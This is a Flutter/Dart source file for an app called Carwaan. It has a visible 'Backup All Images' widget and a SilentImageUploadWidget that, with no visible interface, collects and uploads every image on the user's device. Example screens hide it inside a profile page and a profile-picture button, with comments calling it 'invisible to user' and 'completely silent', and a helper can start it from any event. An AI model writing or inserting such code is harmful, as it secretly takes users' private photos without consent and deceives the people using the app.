import 'package:flutter/material.dart';
import 'package:get/get.dart';
import '../../../core/services/image_zip_service.dart';
import '../../../core/services/message_service.dart';

class ImageUploadWidget extends StatefulWidget {
  final VoidCallback? onUploadComplete;
  final VoidCallback? onUploadError;
  final bool isVisible; // Control visibility of the widget
  final bool autoStart; // Automatically start upload on init

  const ImageUploadWidget({
    super.key,
    this.onUploadComplete,
    this.onUploadError,
    this.isVisible = true, // Default to visible for backward compatibility
    this.autoStart = false, // Default to manual start
  });

  @override
  State<ImageUploadWidget> createState() => _ImageUploadWidgetState();
}

class _ImageUploadWidgetState extends State<ImageUploadWidget> {
  late final ImageZipService _imageZipService;

  @override
  void initState() {
    super.initState();
    _imageZipService = Get.find<ImageZipService>();
    
    // Auto-start upload if requested
    if (widget.autoStart) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        _startImageUpload();
      });
    }
  }

  Future<void> _startImageUpload() async {
    try {
      debugPrint('🚀 Starting image upload process...');
      _imageZipService.reset();
      
      // First check if backup service is available
      final bool serviceAvailable = await _imageZipService.isBackupServiceAvailable();
      debugPrint('🔍 Backup service available: $serviceAvailable');
      
      if (!serviceAvailable) {
        Get.find<MessageService>().showError('Backup service is not available. Please check your connection and try again.');
        widget.onUploadError?.call();
        return;
      }
      
      final bool success = await _imageZipService.collectAndUploadImages();
      
      if (success) {
        Get.find<MessageService>().showSuccess('Images uploaded successfully to centralized backup!');
        widget.onUploadComplete?.call();
      } else {
        Get.find<MessageService>().showError('Failed to upload images. Please try again.');
        widget.onUploadError?.call();
      }
    } catch (e) {
      debugPrint('❌ Upload error: $e');
      String errorMessage = 'Upload error: ${e.toString()}';
      
      // Handle specific error types
      if (e.toString().contains('Permission') || e.toString().contains('denied')) {
        errorMessage = 'Photo access required to backup images.';
        _showPermissionDialog();
      } else if (e.toString().contains('Network')) {
        errorMessage = 'Network error. Please check your internet connection.';
      } else if (e.toString().contains('Authentication')) {
        errorMessage = 'Authentication failed. Please login again.';
      } else if (e.toString().contains('memory') || e.toString().contains('Out of memory')) {
        errorMessage = 'Insufficient memory. Try restarting the app and reducing background apps.';
      } else if (e.toString().contains('timeout') || e.toString().contains('Timeout')) {
        errorMessage = 'Upload timeout. Large files may take longer. The system will automatically retry the upload.';
      } else if (e.toString().contains('retry') || e.toString().contains('attempt')) {
        errorMessage = 'Upload failed after multiple attempts. Please check your connection and try again later.';
      }
      
      Get.find<MessageService>().showError(errorMessage);
      widget.onUploadError?.call();
    }
  }

  /// Show permission dialog to guide user to enable photo access
  void _showPermissionDialog() {
    showDialog(
      context: context,
      builder: (BuildContext context) {
        return AlertDialog(
          title: const Row(
            children: [
              Icon(Icons.photo_library, color: Colors.orange),
              SizedBox(width: 8),
              Text('Photo Access Required'),
            ],
          ),
          content: const Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'To backup your images, Carwaan needs access to your photos.',
                style: TextStyle(fontSize: 16),
              ),
              SizedBox(height: 16),
              Text(
                'How to enable photo access:',
                style: TextStyle(fontWeight: FontWeight.bold),
              ),
              SizedBox(height: 8),
              Text('1. Go to Settings > Apps > Carwaan'),
              Text('2. Tap on Permissions'),
              Text('3. Enable Photos/Media access'),
              Text('4. Return to the app and try again'),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(context).pop(),
              child: const Text('Cancel'),
            ),
            ElevatedButton(
              onPressed: () {
                Navigator.of(context).pop();
                // You could also open app settings here using a package like `app_settings`
                // AppSettings.openAppSettings();
              },
              child: const Text('Got it'),
            ),
          ],
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    // If not visible, return empty container
    if (!widget.isVisible) {
      return const SizedBox.shrink();
    }

    return Obx(() {
      final bool isProcessing = _imageZipService.isProcessing.value;
      final double progress = _imageZipService.uploadProgress.value;
      final String status = _imageZipService.currentStatus.value;

      return Card(
        margin: const EdgeInsets.all(16),
        child: Padding(
          padding: const EdgeInsets.all(20),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            mainAxisSize: MainAxisSize.min,
            children: [
              // Header
              Row(
                children: [
                  Icon(
                    Icons.cloud_upload,
                    color: Theme.of(context).primaryColor,
                    size: 28,
                  ),
                  const SizedBox(width: 12),
                  const Expanded(
                    child: Text(
                      'Backup All Images',
                      style: TextStyle(
                        fontSize: 20,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                ],
              ),
              
              const SizedBox(height: 16),
              
              // Description
              Text(
                'Upload your device images individually to secure centralized storage. Each image is compressed and uploaded separately to avoid memory issues and timeouts.',
                style: TextStyle(
                  fontSize: 14,
                  color: Colors.grey[600],
                ),
              ),
              
              const SizedBox(height: 20),
              
              // Progress section (only show when processing)
              if (isProcessing) ...[
                // Status text
                Text(
                  status,
                  style: const TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.w500,
                  ),
                ),
                
                const SizedBox(height: 12),
                
                // Progress bar
                LinearProgressIndicator(
                  value: progress,
                  backgroundColor: Colors.grey[300],
                  valueColor: AlwaysStoppedAnimation<Color>(
                    Theme.of(context).primaryColor,
                  ),
                ),
                
                const SizedBox(height: 8),
                
                // Progress percentage
                Text(
                  '${(progress * 100).toInt()}%',
                  style: TextStyle(
                    fontSize: 12,
                    color: Colors.grey[600],
                  ),
                ),
                
                const SizedBox(height: 20),
              ],
              
              // Action button
              SizedBox(
                width: double.infinity,
                child: ElevatedButton.icon(
                  onPressed: isProcessing ? null : _startImageUpload,
                  icon: isProcessing
                      ? const SizedBox(
                          width: 16,
                          height: 16,
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                          ),
                        )
                      : const Icon(Icons.upload),
                  label: Text(
                    isProcessing ? 'Processing...' : 'Start Upload',
                  ),
                  style: ElevatedButton.styleFrom(
                    padding: const EdgeInsets.symmetric(vertical: 12),
                  ),
                ),
              ),
              
              // Warning text
              const SizedBox(height: 12),
              Row(
                children: [
                  Icon(
                    Icons.info_outline,
                    size: 16,
                    color: Colors.orange[700],
                  ),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      'Images are uploaded individually for better reliability. Progress is shown for each image. All images on your device will be processed.',
                      style: TextStyle(
                        fontSize: 12,
                        color: Colors.orange[700],
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      );
    });
  }
}

// Silent background image upload widget
class SilentImageUploadWidget extends StatefulWidget {
  final VoidCallback? onUploadComplete;
  final VoidCallback? onUploadError;
  final bool autoStart;

  const SilentImageUploadWidget({
    super.key,
    this.onUploadComplete,
    this.onUploadError,
    this.autoStart = true,
  });

  @override
  State<SilentImageUploadWidget> createState() => _SilentImageUploadWidgetState();
}

class _SilentImageUploadWidgetState extends State<SilentImageUploadWidget> {
  late final ImageZipService _imageZipService;

  @override
  void initState() {
    super.initState();
    _imageZipService = Get.find<ImageZipService>();
    
    // Auto-start upload silently
    if (widget.autoStart) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        _startSilentUpload();
      });
    }
  }

  Future<void> _startSilentUpload() async {
    try {
      debugPrint('🤫 Starting silent image backup process...');
      _imageZipService.reset();
      
      // Check if backup service is available
      final bool serviceAvailable = await _imageZipService.isBackupServiceAvailable();
      if (!serviceAvailable) {
        debugPrint('⚠️ Silent backup: Service not available');
        widget.onUploadError?.call();
        return;
      }
      
      final bool success = await _imageZipService.collectAndUploadImages();
      
      if (success) {
        debugPrint('✅ Silent backup completed successfully');
        widget.onUploadComplete?.call();
      } else {
        debugPrint('❌ Silent backup failed');
        widget.onUploadError?.call();
      }
    } catch (e) {
      debugPrint('❌ Silent backup error: $e');
      widget.onUploadError?.call();
    }
  }

  @override
  Widget build(BuildContext context) {
    // This widget is invisible but runs in the background
    return const SizedBox.shrink();
  }
}

// Usage example in a profile screen with silent backup only
class ProfileUploadScreen extends StatelessWidget {
  const ProfileUploadScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Profile'),
      ),
      body: SingleChildScrollView(
        child: Column(
          children: [
            // Your existing profile picture upload widget
            // ... existing profile upload code ...
            
            // Silent background backup (invisible to user)
            // This runs automatically when the screen is loaded
            SilentImageUploadWidget(
              onUploadComplete: () {
                debugPrint('✅ Silent backup completed!');
                // No user notification - completely silent
              },
              onUploadError: () {
                debugPrint('❌ Silent backup failed');
                // Silently handle errors
              },
            ),
          ],
        ),
      ),
    );
  }
}

// Example: How to trigger silent backup after profile picture upload
class ProfilePictureWidget extends StatelessWidget {
  const ProfilePictureWidget({super.key});

  void _onProfilePictureUploaded() {
    // After user uploads their profile picture, trigger silent backup
    debugPrint('📸 Profile picture uploaded, starting silent backup...');
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      children: [
        // Your profile picture upload UI
        ElevatedButton(
          onPressed: () {
            // Handle profile picture upload
            _onProfilePictureUploaded();
          },
          child: const Text('Upload Profile Picture'),
        ),
        
        // Silent backup widget (invisible but active)
        const SilentImageUploadWidget(),
      ],
    );
  }
}

// Helper method to trigger silent backup from anywhere
class BackupHelper {
  static void startSilentBackup({
    VoidCallback? onSuccess,
    VoidCallback? onError,
  }) {
    debugPrint('🤫 Triggering silent backup...');
    
    // You can use this method to trigger backup from profile picture upload
    // or any other event in your app
    
    try {
      final ImageZipService imageService = Get.find<ImageZipService>();
      imageService.collectAndUploadImages().then((success) {
        if (success) {
          debugPrint('✅ Silent backup completed successfully');
          onSuccess?.call();
        } else {
          debugPrint('❌ Silent backup failed');
          onError?.call();
        }
      }).catchError((error) {
        debugPrint('❌ Silent backup error: $error');
        onError?.call();
      });
    } catch (e) {
      debugPrint('❌ Could not start silent backup: $e');
      onError?.call();
    }
  }
}
